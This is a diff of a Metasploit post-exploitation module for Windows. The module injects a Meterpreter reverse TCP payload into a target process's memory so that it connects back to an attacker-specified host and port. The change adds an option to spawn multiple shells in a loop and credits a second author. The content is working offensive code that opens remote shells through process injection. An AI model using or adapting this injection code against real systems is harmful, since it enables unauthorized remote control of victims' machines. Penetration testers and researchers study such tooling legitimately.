@@ -1,14 +1,15 @@
 ##
-# ## This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'rex'
+require 'msf/core/post/common'
 
 class Metasploit3 < Msf::Post
+
+  include Msf::Post::Common
 
   def initialize(info={})
     super( update_info( info,
@@ -19,32 +20,28 @@ class Metasploit3 < Msf::Post
         using a reverse x86 TCP Meterpreter Payload.
       },
       'License'       => MSF_LICENSE,
-      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>',
+                           'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>' # added multiple payload support
+                         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
     ))
 
     register_options(
       [
-        OptString.new('PAYLOAD',
-          [false, 'Windows Payload to inject into memory of a process.',
-            "windows/meterpreter/reverse_tcp"]),
-        OptAddress.new('LHOST',
-          [true, 'IP of host that will receive the connection from the payload.']),
-        OptInt.new('LPORT',
-          [false, 'Port for Payload to connect to.', 4433]),
-        OptInt.new('PID',
-          [false, 'Process Identifier to inject of process to inject payload.']),
-        OptBool.new('HANDLER',
-          [ false, 'Start an Exploit Multi Handler to receive the connection', false]),
-        OptString.new('OPTIONS',
-        [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",
-          ""])
-      ], self.class)
+        OptString.new('PAYLOAD',   [false, 'Windows Payload to inject into memory of a process.', "windows/meterpreter/reverse_tcp"]),
+        OptAddress.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),
+        OptInt.new('LPORT', [false, 'Port for Payload to connect to.', 4433]),
+        OptInt.new('PID', [false, 'Process Identifier to inject of process to inject payload.']),
+        OptBool.new('HANDLER', [ false, 'Start an Exploit Multi Handler to receive the connection', false]),
+        OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format."]),
+        OptInt.new('AMOUNT',  [false, 'Select the amount of shells you want to spawn.', 1])
+        ], self.class)
   end
 
   # Run Method for when run command is issued
   def run
+
     # syinfo is only on meterpreter sessions
     print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
 
@@ -62,6 +59,7 @@ class Metasploit3 < Msf::Post
     opts     = datastore['OPTIONS']
     # Create payload
     payload = create_payload(pay_name,lhost,lport,opts)
+
     if pid == 0 or not has_pid?(pid)
       pid = create_temp_proc(payload)
     end
@@ -71,7 +69,12 @@ class Metasploit3 < Msf::Post
       return false
     else
       create_multihand(payload,pay_name,lhost,lport) if datastore['HANDLER']
-      inject_into_pid(payload,pid,datastore['NEWPROCESS'])
+
+      datastore['AMOUNT'].times do # iterate through number of shells
+
+          inject_into_pid(payload,pid,datastore['NEWPROCESS'])
+
+      end
     end
   end
 
@@ -98,7 +101,7 @@ class Metasploit3 < Msf::Post
     pay = client.framework.payloads.create(name)
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
-    if not opts.empty?
+    if not opts.blank?
       opts.split(",").each do |o|
         opt,val = o.split("=",2)
         pay.datastore[opt] = val
